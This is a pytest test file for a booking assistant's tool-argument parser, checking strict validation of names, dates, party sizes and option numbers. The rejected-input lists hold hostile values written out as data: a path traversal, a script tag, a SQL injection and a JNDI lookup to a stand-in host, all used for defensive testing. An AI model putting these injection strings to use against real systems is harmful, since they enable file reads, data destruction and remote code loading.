"""Tests for the arguments of LB-02's tools: what a model writes is parsed strictly, and never echoed back."""

import json
from datetime import date

import pytest

from lb02.limits import MAX_SHOWN_SLOTS
from lb02.states import Tool
from lb02.tools import (
    ARGUMENT_SCHEMAS,
    MAX_ARGUMENT_CHARS,
    CheckAvailabilityArguments,
    HandoffArguments,
    HoldSlotArguments,
    NoArguments,
    UpdateDetailsArguments,
    parse_arguments,
    parse_tool,
)


def test_every_tool_has_an_argument_schema() -> None:
    """A tool without a schema would run on unchecked input, so each one in the state machine has its own."""
    assert set(ARGUMENT_SCHEMAS) == set(Tool)


def test_a_tool_name_is_one_of_ours_or_nothing() -> None:
    """Names the service doesn't know, in any spelling, are not tools."""
    assert parse_tool("hold_slot") == Tool.HOLD_SLOT
    assert parse_tool("Hold_Slot") is None
    assert parse_tool("hold_slot ") is None
    assert parse_tool("transfer_money") is None
    assert parse_tool("") is None


def test_details_are_read_into_typed_fields() -> None:
    """Dates become dates, numbers numbers, and the fields the model left out stay unset."""
    parsed = parse_arguments(
        Tool.UPDATE_DETAILS,
        '{"offering": "cupping", "party_size": 2, "name": "Jana Novak", "date_from": "2026-10-02", '
        '"date_to": "2026-10-03", "part_of_day": "afternoon"}',
    )

    assert isinstance(parsed, UpdateDetailsArguments)
    assert (parsed.offering, parsed.party_size, parsed.name) == ("cupping", 2, "Jana Novak")
    assert (parsed.date_from, parsed.date_to) == (date(2026, 10, 2), date(2026, 10, 3))
    assert parsed.part_of_day == "afternoon"


def test_a_single_field_is_enough_for_update_details() -> None:
    """The visitor often gives one thing at a time, so one field is a whole call."""
    parsed = parse_arguments(Tool.UPDATE_DETAILS, '{"party_size": 4}')

    assert isinstance(parsed, UpdateDetailsArguments)
    assert parsed.model_dump(exclude_none=True) == {"party_size": 4}


@pytest.mark.parametrize("text", ["{}", '{"offering": null}', '{"party_size": null, "name": null}', ""])
def test_update_details_with_nothing_in_it_is_refused(text: str) -> None:
    """A call that records nothing is an error, so the model can't loop on empty calls unnoticed."""
    with pytest.raises(ValueError, match="invalid arguments: arguments"):
        parse_arguments(Tool.UPDATE_DETAILS, text)


@pytest.mark.parametrize(
    "text",
    [
        '{"party_size": 0}',
        '{"party_size": 13}',
        '{"party_size": "two"}',
        '{"party_size": 2.5}',
        '{"party_size": true}',
        '{"date_from": "tomorrow"}',
        '{"date_from": "2026-13-01"}',
        '{"date_from": "2026-10-03", "date_to": "2026-10-02"}',
        '{"part_of_day": "midnight"}',
        '{"offering": "Cupping Session"}',
        '{"offering": "../../etc/passwd"}',
        '{"offering": "cupping", "price": 0}',
        '{"discount": 100}',
    ],
)
def test_arguments_outside_the_schema_are_refused(text: str) -> None:
    """Wrong types, out-of-range numbers, impossible dates, unknown fields: none is accepted or guessed at."""
    with pytest.raises(ValueError, match="invalid arguments"):
        parse_arguments(Tool.UPDATE_DETAILS, text)


@pytest.mark.parametrize(
    "name",
    ["Jana Novak", "Petr Dvořák", "Zoë O'Brien", "Anne-Marie Smith", "Dr. Kim", "Łukasz Żółć", "Анна Иванова", "李雷"],
)
def test_names_in_any_alphabet_are_accepted(name: str) -> None:
    """A guest's name is letters, spaces, apostrophes, hyphens and dots, in any language."""
    parsed = parse_arguments(Tool.UPDATE_DETAILS, json.dumps({"name": name}))

    assert isinstance(parsed, UpdateDetailsArguments)
    assert parsed.name == name


@pytest.mark.parametrize(
    "name",
    [
        "A",
        "",
        "   ",
        "Jana1 Novak",
        "<script>alert(1)</script>",
        "Robert'); DROP TABLE slots;--",
        "Jana\nNovak",
        "Jana​Novak",
        "x" * 61,
        "jana@example.test",
        "${jndi:ldap://evil}",
        "-Jana",
    ],
)
def test_names_that_are_markup_code_or_numbers_are_refused(name: str) -> None:
    """The name ends up in a transcript, a mock email and a person's screen, so it can't carry markup or code."""
    with pytest.raises(ValueError, match="invalid arguments: name"):
        parse_arguments(Tool.UPDATE_DETAILS, json.dumps({"name": name}))


def test_an_error_names_the_fields_and_never_repeats_what_the_model_wrote() -> None:
    """A refusal goes back to the model and into logs, so it holds field names and rules only."""
    secret = "TOKEN-9f3a-do-not-print"

    with pytest.raises(ValueError, match="invalid arguments: name, party_size") as raised:
        parse_arguments(Tool.UPDATE_DETAILS, json.dumps({"name": secret, "party_size": secret}))

    assert secret not in str(raised.value)


def test_a_search_window_may_be_given_in_part() -> None:
    """A new search can change the days, the part of the day, or both; what it leaves out keeps its last value."""
    parsed = parse_arguments(Tool.CHECK_AVAILABILITY, '{"part_of_day": "evening"}')

    assert isinstance(parsed, CheckAvailabilityArguments)
    assert (parsed.date_from, parsed.date_to, parsed.part_of_day) == (None, None, "evening")
    with pytest.raises(ValueError, match="invalid arguments"):
        parse_arguments(Tool.CHECK_AVAILABILITY, '{"date_from": "2026-10-05", "date_to": "2026-10-04"}')


@pytest.mark.parametrize("option", [1, 6, MAX_SHOWN_SLOTS])
def test_hold_slot_takes_an_option_number_in_range(option: int) -> None:
    """The model names the number an option was shown with, which may be past 6 once slots have come and gone."""
    parsed = parse_arguments(Tool.HOLD_SLOT, json.dumps({"option": option}))

    assert parsed == HoldSlotArguments(option=option)


@pytest.mark.parametrize(
    "text",
    ["{}", '{"option": 0}', f'{{"option": {MAX_SHOWN_SLOTS + 1}}}', '{"option": "1"}', '{"slot_id": 12}'],
)
def test_hold_slot_refuses_anything_but_an_option_number(text: str) -> None:
    """A slot ID, a missing number or one no conversation could have been given is an error."""
    with pytest.raises(ValueError, match="invalid arguments"):
        parse_arguments(Tool.HOLD_SLOT, text)


@pytest.mark.parametrize("tool", [Tool.CONFIRM_BOOKING, Tool.RELEASE_HOLD])
def test_confirm_and_release_take_nothing(tool: Tool) -> None:
    """They act on the conversation's own hold, so a slot named in the call is an error rather than a request."""
    assert parse_arguments(tool, "{}") == NoArguments()
    assert parse_arguments(tool, "") == NoArguments()
    with pytest.raises(ValueError, match="invalid arguments: slot_id"):
        parse_arguments(tool, '{"slot_id": 12}')


def test_a_handoff_gives_one_of_three_reasons() -> None:
    """The reasons are a closed list the person who takes over can rely on."""
    assert parse_arguments(Tool.HANDOFF_TO_PERSON, '{"reason": "out_of_scope"}') == HandoffArguments(
        reason="out_of_scope"
    )
    with pytest.raises(ValueError, match="invalid arguments: reason"):
        parse_arguments(Tool.HANDOFF_TO_PERSON, '{"reason": "abuse"}')


@pytest.mark.parametrize(
    ("text", "message"),
    [
        ("not json {", "aren't valid JSON"),
        ("[1, 2]", "must be a JSON object"),
        ('"hold_slot"', "must be a JSON object"),
        ("null", "must be a JSON object"),
        ("x" * (MAX_ARGUMENT_CHARS + 1), "too long"),
    ],
)
def test_arguments_that_arent_a_json_object_are_refused_before_validation(text: str, message: str) -> None:
    """Text that isn't a JSON object, or is far too long, is refused for what it is, without being read further."""
    with pytest.raises(ValueError, match=message):
        parse_arguments(Tool.UPDATE_DETAILS, text)
